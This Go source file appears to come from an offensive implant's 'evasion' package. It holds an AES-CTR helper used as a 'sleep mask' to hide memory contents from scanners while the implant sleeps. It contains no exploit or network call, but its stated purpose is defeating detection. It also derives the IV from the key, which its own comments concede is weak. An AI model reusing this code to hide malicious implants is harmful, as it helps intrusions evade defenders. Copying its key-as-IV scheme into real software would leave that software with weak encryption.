//go:build windows || linux

package evasion

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
)

// AESCTRCrypt XORs data in place with the AES-CTR keystream derived
// from key. CTR mode is symmetric: the same call with the same key
// reverses itself.
//
// The IV is taken from the first aes.BlockSize bytes of the key. This
// makes the function usable as both an encryptor and a decryptor
// without requiring the caller to carry a separate nonce. It is
// safe here because:
//
//   - Sleep mask keys are generated fresh per sleep cycle. No (key,
//     IV) pair is ever reused across cycles.
//   - The mask provides obfuscation against casual memory scanners,
//     not semantic security against a determined analyst.
//
// Do not use this function for any purpose other than the sleep mask.
func AESCTRCrypt(data, key []byte) error {
	if len(key) < aes.BlockSize {
		return fmt.Errorf("AES-CTR requires a key of at least %d bytes",
			aes.BlockSize)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Errorf("aes.NewCipher: %w", err)
	}
	iv := key[:aes.BlockSize]
	stream := cipher.NewCTR(block, iv)
	stream.XORKeyStream(data, data)
	return nil
}